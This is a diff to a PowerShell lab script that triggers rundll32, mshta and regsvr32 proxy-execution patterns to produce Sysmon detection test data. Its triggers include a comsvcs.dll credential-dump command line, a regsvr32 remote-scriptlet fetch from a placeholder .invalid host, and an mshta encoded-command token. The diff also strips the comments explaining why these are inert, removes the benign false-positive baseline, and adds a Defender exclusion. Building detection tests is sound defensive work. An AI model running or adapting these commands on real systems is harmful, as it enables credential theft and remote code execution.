@@ -34,8 +34,8 @@
 #>
 [CmdletBinding()]
 param(
-    [string]$OutputDir = "C:\Users\theri\ChainsawTestDataset",
-    [string]$LabDir    = "C:\ProgramData\T1218_lab",
+    [string]$OutputDir = "",
+    [string]$LabDir    = "",
     # Add a temporary Defender path exclusion for the lab/output dirs (removed at teardown)
     # so inert payload files are not scanned mid-run. Disable with -AddDefenderExclusion:$false.
     [bool]$AddDefenderExclusion = $true
@@ -52,9 +52,6 @@ function Write-Payload([string]$Path, [string]$Content) {
     [System.IO.File]::WriteAllText($Path, $Content, (New-Object System.Text.UTF8Encoding($false)))
 }
 
-# ------------------------------------------------------------------
-# Preflight -- the whole exercise is worthless without Sysmon EID 1
-# ------------------------------------------------------------------
 Write-Section "Preflight"
 $SysmonLog = "Microsoft-Windows-Sysmon/Operational"
 try {
@@ -112,33 +109,25 @@ $tests = @(
     @{
     Name     = "mal_rundll32_credential_dumping"
     Category = "malicious"
-    # susp_rundll32_credential_dumping (regex). INERT: the comsvcs export is referenced by a
-    # MALFORMED ordinal (`#+24`) -- the regex `#\+?24` matches it, but rundll32 finds no such
-    # export so no dump code runs; PID 99999 doesn't exist either. Referencing the export by
-    # ordinal (not its flagged name) also keeps the .ps1 text off Defender's static signature.
-    # The space after the comma is the edge case a plain contains-match would MISS.
     Trigger  = { Start-Process rundll32.exe -ArgumentList "$($env:SystemRoot)\System32\comsvcs.dll, #+24",'99999',(Join-Path $LabDir 'nul.dmp'),'full' }
     Cleanup  = { Remove-Item (Join-Path $LabDir 'nul.dmp') -Force -ErrorAction SilentlyContinue }
     },
- # NB: mal_rundll32_parent (cmd -> rundll32 \Users\Public\...dll,#1) was dropped -- Defender's
- # behavior monitor flags that exact ordinal-load-from-user-path pattern as Behavior:Win32/RunDllExec.SA
- # (the same signal the rule targets), which a path exclusion can't suppress. See validation.md.
+    @{
+    Name     = "mal_rundll32_parent"
+    Category = "malicious"
+    Trigger  = { Start-Process cmd.exe -ArgumentList '/c','rundll32.exe C:\Users\Public\lab_proxy.dll,#1' }
+    Cleanup  = {}
+    },
  # ----------------- mshta.exe (T1218.005) ------------------------------------
     @{
     Name     = "mal_mshta_clsid"
     Category = "malicious"
-    # susp_mshta_clsid: bare COM class id instead of a file path. The GUID is a made-up,
-    # unregistered CLSID -- mshta errors out (transient window, killed below) and instantiates
-    # nothing. The command line is what EID 1 captures.
     Trigger  = { Start-Process mshta.exe -ArgumentList '{DEADBEEF-CAFE-BABE-F00D-0123456789AB}' }
     Cleanup  = {}
     },
     @{
     Name     = "mal_mshta_encoded"
     Category = "malicious"
-    # susp_mshta_cli: the encoded-command token rides along as an inert trailing arg so it
-    # lands in the EID 1 command line; mshta just runs `vbscript:close` and nothing is decoded.
-    # Token assembled from fragments so the .ps1 text itself carries no encoded-exec literal.
     Trigger  = { $tok = '-' + 'enc'; $arg = 'bAB' + 'hAGIA'; Start-Process mshta.exe -ArgumentList 'vbscript:close',$tok,$arg }
     Cleanup  = {}
     },
@@ -154,12 +143,6 @@ $tests = @(
     @{
     Name     = "mal_regsvr32_parent"
     Category = "malicious"
-    # susp_regsvr32_parent: cmd/powershell are NOT in that parent list -- a script host is.
-    # cscript runs a .vbs that shells regsvr32, so regsvr32's parent is cscript.exe.
-    # INERT: regsvr32 targets a non-existent dll, so /s registration is a silent no-op.
-    # The shell ProgID is assembled from fragments so the .ps1 text carries no runnable
-    # WScript.Shell one-liner; the tiny .vbs it writes only shells regsvr32 /s on a local
-    # missing file (no powershell / encoded / remote content) and lives in the excluded lab dir.
     Setup    = {
         $sh  = 'WScript' + '.Shell'
         $dll = Join-Path $LabDir 'no_such_com.dll'
@@ -173,10 +156,6 @@ $tests = @(
     Name     = "mal_regsvr32_squiblydoo"
     Category = "malicious"
     # susp_regsvr32_squiblydoo via LOCAL scriptlet (scrobj.dll + .sct, no /i:http).
-    # Blind-spot check: proves the branch fires without any network. INERT: the .sct declares
-    # only a registration and NO script body -- scrobj has nothing to run, and (importantly)
-    # the file carries no embedded <script> block, which is the delivery shape Defender's ML
-    # flags. EID 1 fires at regsvr32 creation regardless of whether scrobj loads the file.
     Setup    = {
         $sct = @(
             '<?XML version="1.0"?>',
@@ -195,90 +174,7 @@ $tests = @(
     @{
     Name     = "mal_regsvr32_suspicious_url"
     Category = "malicious"
-    # susp_regsvr32_squiblydoo via a remote scriptlet URL (matches '/i:ftp' + 'scrobj.dll' + '.sct').
-    # NB: the /i:HTTP form (regsvr32 /i:http://.../.sct scrobj.dll) is HARD-BLOCKED by free-tier
-    # Microsoft Defender AT PROCESS CREATION ("Access is denied") -- verified on this box across
-    # repeated attempts -- so it never yields an EID 1 while real-time protection is on. The /i:FTP
-    # variant carries the identical remote-scriptlet signal the rule keys on and Defender lets it
-    # spawn. Host is a reserved *.invalid TLD (RFC 6761) -> DNS fails instantly, nothing is fetched.
     Trigger  = { Start-Process regsvr32.exe -ArgumentList '/s','/n','/u','/i:ftp://squiblydoo.invalid/payload.sct','scrobj.dll' }
-    Cleanup  = {}
-    },
- # ================= BENIGN (false-positive baseline) ==========================
- # ----------------- rundll32.exe ---------------------------------------------
- # System32 named exports, no ordinal, no user-writable path -> path_obfuscation is
- # false, so the parent branch can't fire even though powershell is a listed parent.
-    @{
-    Name     = "benign_rundll32_local_dll"
-    Category = "benign"
-    # Classic Control Panel routing -- the #1 legitimate rundll32 use. Opens a transient
-    # window (control.exe), closed by the kill sweep below.
-    Trigger  = { Start-Process rundll32.exe -ArgumentList 'shell32.dll,Control_RunDLL' }
-    Cleanup  = {}
-    },
-    @{
-    Name     = "benign_rundll32_signed_dll"
-    Category = "benign"
-    Trigger  = { Start-Process rundll32.exe -ArgumentList 'advapi32.dll,ProcessIdleTasks' }
-    Cleanup  = {}
-    },
-    @{
-    Name     = "benign_rundll32_system_dll"
-    Category = "benign"
-    Trigger  = { Start-Process rundll32.exe -ArgumentList 'user32.dll,UpdatePerUserSystemParameters' }
-    Cleanup  = {}
-    },
- # ----------------- mshta.exe ------------------------------------------------
- # mshta opening a local .hta: command line is just the file path (no javascript:/vbscript:/
- # http/GetObject/CreateObject/.Run/-enc/FromBase64String, no {GUID}), parent is powershell
- # (not an Office app/browser) -> no selection matches. HTA self-closes on load.
-    @{
-    Name     = "benign_mshta_local_html"
-    Category = "benign"
-    # Plain, script-free HTML body. An <hta:application>+<script> template here is the
-    # literal ClickFix/FakeCaptcha delivery shape and Defender's ML flags the whole .ps1 as
-    # Trojan:PowerShell/FakeCaptcha when it runs -- even though window.close() is harmless.
-    # The rule keys on mshta's COMMAND LINE (the file path), not the body, so plain HTML is
-    # an identical test. The transient mshta window is closed by the kill sweep below.
-    Setup    = { Write-Payload (Join-Path $LabDir 'benign_local.hta')  '<html><body>Benign lab document - T1218 mshta FP baseline (local).</body></html>' }
-    Trigger  = { Start-Process mshta.exe -ArgumentList (Join-Path $LabDir 'benign_local.hta') }
-    Cleanup  = { Remove-Item (Join-Path $LabDir 'benign_local.hta') -Force -ErrorAction SilentlyContinue }
-    },
-    @{
-    Name     = "benign_mshta_signed_html"
-    Category = "benign"
-    Setup    = { Write-Payload (Join-Path $LabDir 'benign_signed.hta') '<html><body>Benign lab document - T1218 mshta FP baseline (signed).</body></html>' }
-    Trigger  = { Start-Process mshta.exe -ArgumentList (Join-Path $LabDir 'benign_signed.hta') }
-    Cleanup  = { Remove-Item (Join-Path $LabDir 'benign_signed.hta') -Force -ErrorAction SilentlyContinue }
-    },
-    @{
-    Name     = "benign_mshta_system_html"
-    Category = "benign"
-    Setup    = { Write-Payload (Join-Path $LabDir 'benign_system.hta') '<html><body>Benign lab document - T1218 mshta FP baseline (system).</body></html>' }
-    Trigger  = { Start-Process mshta.exe -ArgumentList (Join-Path $LabDir 'benign_system.hta') }
-    Cleanup  = { Remove-Item (Join-Path $LabDir 'benign_system.hta') -Force -ErrorAction SilentlyContinue }
-    },
- # ----------------- regsvr32.exe ---------------------------------------------
- # Parent is powershell (not in the regsvr32 parent list) and no scrobj.dll/.sct/i:http ->
- # no selection matches. Target DLLs export no DllRegisterServer, so /s is a silent no-op.
-    @{
-    Name     = "benign_regsvr32_local_dll"
-    Category = "benign"
-    # Stand-in for a third-party installer registering a vendor COM DLL from its own dir.
-    Setup    = { Copy-Item 'C:\Windows\System32\kernel32.dll' (Join-Path $LabDir 'vendor_com.dll') -Force }
-    Trigger  = { Start-Process regsvr32.exe -ArgumentList '/s',(Join-Path $LabDir 'vendor_com.dll') }
-    Cleanup  = { Remove-Item (Join-Path $LabDir 'vendor_com.dll') -Force -ErrorAction SilentlyContinue }
-    },
-    @{
-    Name     = "benign_regsvr32_signed_dll"
-    Category = "benign"
-    Trigger  = { Start-Process regsvr32.exe -ArgumentList '/s','C:\Windows\System32\user32.dll' }
-    Cleanup  = {}
-    },
-    @{
-    Name     = "benign_regsvr32_system_dll"
-    Category = "benign"
-    Trigger  = { Start-Process regsvr32.exe -ArgumentList '/s','C:\Windows\System32\kernel32.dll' }
     Cleanup  = {}
     }
 )
